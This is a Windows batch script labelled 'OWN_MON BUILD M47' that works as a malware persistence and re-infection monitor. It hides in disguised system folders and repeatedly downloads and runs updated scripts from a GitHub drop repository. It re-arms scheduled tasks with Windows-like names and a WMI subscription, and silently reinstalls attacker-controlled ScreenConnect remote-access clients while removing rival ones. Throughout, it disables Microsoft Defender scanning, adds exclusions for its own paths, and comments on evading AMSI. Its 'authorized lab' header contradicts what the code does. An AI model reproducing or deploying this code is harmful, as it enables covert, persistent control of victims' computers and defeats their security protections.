@echo off
rem ═══════════════════════════════════════════════════════════════
rem  OWN_MON  BUILD 20260804M47
rem  M47: HARD stop Gryxa interrupts — no raw sevrz /i; detect any non-sevrz SC; adopt live FP.
rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
rem  M45: L42 safe FP migrate (install new before removing old Gryxa).
rem  M44: force_gryxa.flag must NOT /x live Gryxa (L41 force-skip-if-running).
rem  M43: AMSI-proof Gryxa fallback via own_gryxa.cmd (pure msiexec) when PS blocked/missing.
rem  M42: signed manifest; sevrz.cfg; sibling-safe sevrz /i.
rem  Authorized internal deployment - lab/competition scope only.
rem ═══════════════════════════════════════════════════════════════
setlocal EnableDelayedExpansion

set "KEEP_FP=5f6010579852e507"
set "ALT_FP=f861c8140d453427"
set "GRYXA_FP=36e506ff016b2151"
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\own_mon.log"
set "STATE=%WD%\own_mon.state"
set "HBFLAG=%WD%\hb.flag"
set "CURL=%SystemRoot%\System32\curl.exe"
set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
set "OWNGRYXA2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
set "SEVRZ_EXP_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
set "SEVRZ_EXP_URL2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
set "MSICACHE=%WD%\pkg.msi"
set "MSI_G=%ProgramData%\ScreenConnect.Gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"

if not exist "%WD%" md "%WD%" 2>nul
if not exist "%LOG%" type nul>"%LOG%" 2>nul

set "MONVER=M47"
set "PF86=%ProgramFiles(x86)%"
set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
rem load current Gryxa FP (may rotate when server/keys change)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
if not defined GRYXA_FP set "GRYXA_FP=36e506ff016b2151"
for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
echo.>>"%LOG%"
echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
set "COUNT=0"
set "INSTALLED=0"
set "PRIM_OK=0"
set "ALT_OK=0"
set "FOREIGN_LEFT=0"
set "FOREIGN_LIST="
set "MSIEXIT=not-run"

rem ── [0] single-flight mutex (stop overlapping ticks racing msiexec) ──
set "MUTEX=%WD%\tick.lock"
if exist "%MUTEX%" (
  for %%A in ("%MUTEX%") do set "LOCKAGE=%%~tA"
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%MUTEX%') -and (((Get-Date)-(Get-Item -LiteralPath '%MUTEX%' -Force).LastWriteTime).TotalMinutes -lt 20)){ exit 1 } else { exit 0 }" >nul 2>&1
  if errorlevel 1 (
    echo tick_skipped_mutex_busy>>"%LOG%"
    endlocal
    exit /b 0
  )
)
echo %DATE% %TIME% %RANDOM%>"%MUTEX%"

rem ── per-host identity (anti-signature) ────────────────────────
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"

rem ── [A] auto-update core files (best effort) ──────────────────
if not exist "%CURL%" set "CURL=curl.exe"
rem M35: guarantee update channel — unharden workdir each tick and stage downloads
rem in C:\Windows\Temp (never ACL-locked), then move into %WD%. LockDir cannot freeze us.
set "STAGE=%SystemRoot%\Temp\.upd"
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
attrib -h -s -r "%WD%" >nul 2>&1
takeown /F "%WD%" /R /D Y >nul 2>&1
icacls "%WD%" /reset /T /C /Q >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /T /C /Q >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" "%WD%\own_secure.cmd" "%WD%\own_lib.ps1" "%WD%\own_mon.cmd" >nul 2>&1

set "SELF_UPD=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG%" >nul 2>&1
if not exist "%STAGE%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\tg_report.new" "%TG2%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC%" >nul 2>&1
if not exist "%STAGE%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%STAGE%\own_secure.new" "%OWNSEC2%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB%" >nul 2>&1
if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB2%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON%" >nul 2>&1
if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest" "%MANIFEST_URL%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest.sig" "%MANIFEST_SIG_URL%" >nul 2>&1

rem M42: signed update.manifest gate (RSA-SHA256). Fallback to BUILD markers if no pubkey yet.
set "UPD_OK=0"
set "MAP="
if exist "%STAGE%\own_lib.new" set "MAP=!MAP!own_lib.ps1=%STAGE%\own_lib.new;"
if exist "%STAGE%\own_mon.next" set "MAP=!MAP!own_mon.cmd=%STAGE%\own_mon.next;"
if exist "%STAGE%\own_secure.new" set "MAP=!MAP!own_secure.cmd=%STAGE%\own_secure.new;"
if exist "%STAGE%\tg_report.new" set "MAP=!MAP!tg_report.ps1=%STAGE%\tg_report.new;"
if exist "%STAGE%\own_gryxa.new" set "MAP=!MAP!own_gryxa.cmd=%STAGE%\own_gryxa.new;"
set "VRES=missing"
if exist "%WD%\own_lib.ps1" if exist "%STAGE%\update.manifest" if exist "%STAGE%\update.manifest.sig" if defined MAP (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action verify-update -WorkDir "%WD%" -Extra "%STAGE%\update.manifest|%STAGE%\update.manifest.sig|!MAP!"`) do set "VRES=%%R"
)
echo update_verify=!VRES!>>"%LOG%"
if /I "!VRES!"=="ok" (
  set "UPD_OK=1"
) else if /I "!VRES!"=="missing" (
  set "UPD_OK=fallback"
) else if /I "!VRES!"=="no-pubkey" (
  set "UPD_OK=fallback"
) else if /I "!VRES:~0,10!"=="not-in-man" (
  set "UPD_OK=fallback"
) else (
  echo update_refused_!VRES!>>"%LOG%"
)

if /I "!UPD_OK!"=="1" (
  if exist "%STAGE%\tg_report.new" move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
  if exist "%STAGE%\own_secure.new" move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
  if exist "%STAGE%\own_lib.new" move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
  if exist "%STAGE%\own_gryxa.new" findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
  set "SELF_UPD=0"
  if exist "%STAGE%\own_mon.next" (
    fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
    if errorlevel 1 set "SELF_UPD=1"
    if "!SELF_UPD!"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
  )
) else if /I "!UPD_OK!"=="fallback" (
  findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
  findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
  findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
  findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && for %%F in ("%STAGE%\own_gryxa.new") do if %%~zF GTR 500 move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
  set "SELF_UPD=0"
  findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
  if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
    fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
    if errorlevel 1 set "SELF_UPD=1"
  )
  if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
) else (
  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" >nul 2>&1
  set "SELF_UPD=0"
)
del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" >nul 2>&1
del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1

rem M43: if lib still missing (AMSI wiped it / never landed), keep a TEMP copy for fallbacks
if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" copy /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
if not exist "%WD%\own_gryxa.cmd" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
  if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
)

rem M42: sevrz.cfg dynamic FP from repo sevrz_expected.cfg
if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
  if /I "%%K"=="PRIMARY_FP" set "KEEP_FP=%%L"
  if /I "%%K"=="ALT_FP" set "ALT_FP=%%L"
)
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\sevrz_expected.new" "%SEVRZ_EXP_URL%" >nul 2>&1
if not exist "%STAGE%\sevrz_expected.new" "%CURL%" -L --connect-timeout 6 --max-time 20 -o "%STAGE%\sevrz_expected.new" "%SEVRZ_EXP_URL2%" >nul 2>&1
if exist "%STAGE%\sevrz_expected.new" if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$t=Get-Content -LiteralPath '%STAGE%\sevrz_expected.new' -Raw; & '%WD%\own_lib.ps1' -Action sync-sevrz-fp -WorkDir '%WD%' -Extra $t"`) do (
    echo sevrz_sync %%R>>"%LOG%"
    for /f "tokens=2,3 delims=|" %%A in ("%%R") do (
      if not "%%A"=="" set "KEEP_FP=%%A"
      if not "%%B"=="" set "ALT_FP=%%B"
    )
  )
)
del /f /q "%STAGE%\sevrz_expected.new" >nul 2>&1
if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
  if /I "%%K"=="PRIMARY_FP" set "KEEP_FP=%%L"
  if /I "%%K"=="ALT_FP" set "ALT_FP=%%L"
)

rem ── [B] re-arm chain 1: ownership-aware (not existence-only) ──
rem L11/M22: Query-only skipped rearm when Windows built-in tasks shared
rem default names (Diagnosis\Scheduled etc.) -> mon never ran, no log.
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
    set "TASKS_ENSURE=%%R"
  )
)
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\own_mon.cmd" (
  attrib -h -s -r "%ETL%\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
)

rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do set "WD_STATE=%%R"
  if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
)

rem ── [E0] sync Gryxa FP from verified gryxa.com SC BEFORE exterminate ──
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action sync-gryxa-fp -WorkDir "%WD%" >nul 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
)

rem ── [E] exterminate foreign SC + disallowed RMM (AFTER Gryxa FP sync) ──
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
timeout /t 8 /nobreak >nul
set "FOREIGN_LEFT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "FP=%%a"
  set "FP=!FP: =!"
  rem friendly if keeper FP OR gryxa-relay (ImagePath has gryxa.com) — never count new Gryxa as foreign
  set "FRIENDLY=0"
  if /I "!FP!"=="%KEEP_FP%" set "FRIENDLY=1"
  if /I "!FP!"=="%ALT_FP%" set "FRIENDLY=1"
  if /I "!FP!"=="%GRYXA_FP%" set "FRIENDLY=1"
  if "!FRIENDLY!"=="0" (
    for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
      echo %%I | findstr /I "gryxa.com" >nul && set "FRIENDLY=1"
    )
  )
  if "!FRIENDLY!"=="0" (
    set /a COUNT+=1
    set /a FOREIGN_LEFT+=1
    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
    echo foreign_left_!FP!>>"%LOG%"
  )
)

rem ── [C] heal ScreenConnect prim/alt ────────────────────────────
for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
  set "INSTALLED=1"
  set "PRIMSTATE=%%b"
)
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "PRIM_OK=1"
  set /a COUNT+=1
)
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 set /a COUNT+=1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"

if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  echo svc heal restart>>"%LOG%"
  net start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 set "PRIM_OK=1"
)
rem M16: still stopped -> repair the REGISTERED product (msiexec /fa restores
rem binaries + starts the service; L5 Repair-SCService handles stopped svcs)
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  echo svc escalate repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 set "PRIM_OK=1"
)
rem M16: orphaned service entry (product unregistered - eaten by an SC-family
rem upgrade removal) can NEVER start. Delete it and fall through to the
rem fresh-install ladder below instead of alerting "wont start" forever.
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  set "REGSTATE=unknown"
  if exist "%WD%\own_lib.ps1" for /f "delims=" %%R in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"') do set "REGSTATE=%%R"
  echo orphan_check=!REGSTATE!>>"%LOG%"
  if /I "!REGSTATE!"=="no" (
    echo orphan_service_delete>>"%LOG%"
    sc delete "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
    set "INSTALLED=0"
  )
)
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
  call :TgState DOWN "ScreenConnect (%KEEP_FP%) installed but wont start"
  goto :AfterHeal
)
if "%INSTALLED%"=="1" goto :AfterHeal

rem ── [D] primary SC missing - heal ladder ──────────────────────
rem M12: FIRST repair the registered product (recreates service without
rem touching the ALT instance); fresh msiexec install only as fallback.
echo svc missing - heal begin>>"%LOG%"
call :RepairRegistered "%KEEP_FP%"
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "INSTALLED=1"
  set "PRIM_OK=1"
  goto :AfterHeal
)
rem refuse fresh /i if product still registered - Upgrade table can wipe ALT/GRYXA
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "registered-stuck" >nul 2>&1
  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT/GRYXA"
  goto :AfterHeal
)
rem O37: refuse sevrz /i when gryxa already present — shared legacy UpgradeCodes
rem {0C94448B}/{1F85D7FE} make sibling msiexec /i knock Gryxa OFFLINE in panel.
rem M36: detect Gryxa by relay domain too (any running gryxa.com SC), not only by FP.
set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if not errorlevel 1 set "GREG=yes"
sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
if not errorlevel 1 set "GREG=yes"
rem any non-sevrz Running/Pending SC OR ImagePath gryxa.com = Gryxa present
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 set "GREG=yes"
  )
  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
    echo %%I | findstr /I "gryxa.com" >nul && set "GREG=yes"
  )
)
if /I "!GREG!"=="yes" (
  echo primary_skip_i_protect_gryxa>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "protect-gryxa-skip-primary-i" >nul 2>&1
  call :TgState DOWN "Primary missing - refused sevrz /i to protect Gryxa (shared SC UpgradeCodes); /fa only"
  goto :AfterHeal
)
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
if "%INSTALLED%"=="0" (
  rem M47: cached pkg — protect-msi then /i (never raw Upgrade table)
  attrib -h -s -r "%MSICACHE%" >nul 2>&1
  for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
    echo wucache_pkg_protected_install>>"%LOG%"
    attrib -h -s -r "%MSI%" >nul 2>&1
    copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
    set "MSI_SAFE=%MSI%"
    if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
    if /I "!MSI_SAFE!"=="%MSI%" (
      echo wucache_pkg_protect_fail_skip_i>>"%LOG%"
    ) else (
      call :NoMsiPolicy
      msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
      set "MSIEXIT=!ERRORLEVEL!"
      echo cache_protected msiexec exit=!MSIEXIT!>>"%LOG%"
      call :WaitSvc
    )
  )
)
call :RestoreAlt
call :EnsureGryxaMust
if "%INSTALLED%"=="0" (
  if exist "%WD%\msi_heal.log" (
    echo --- msi_heal.log tail --->>"%LOG%"
    powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\msi_heal.log' -Tail 10" >>"%LOG%" 2>&1
  )
  if not defined MSIEXIT set "MSIEXIT=fetch-fail"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "msi-failed" >nul 2>&1
  call :TgState FAIL "MSI install failed on all sources (msiexec exit %MSIEXIT%)"
) else (
  echo svc restored>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "restored" >nul 2>&1
  call :TgState RESTORED "ScreenConnect reinstalled OK"
)

:AfterHeal
rem M16: ALT present-but-stopped -> restart, then repair-by-GUID (every tick)
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 (
  sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
  if errorlevel 1 (
    echo alt stopped - restart/repair>>"%LOG%"
    net start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
    sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
    timeout /t 5 /nobreak >nul
    sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
    if errorlevel 1 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  )
)
rem M17: ALT service entry deleted but product registered -> repair-by-GUID every tick
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if errorlevel 1 (
  echo alt_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
rem (extermination already ran pre-heal in [E]; foreign survivors counted there)

rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
rem M39/M43: MpPreference when WinDefend alive; always also write policy/exclusion REG
rem (Hell host: WinDefend dead → 0x800106ba, but AMSI still blocked PS — reg + own_gryxa.cmd cover it)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ETL%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramFiles%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramFiles(x86)%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
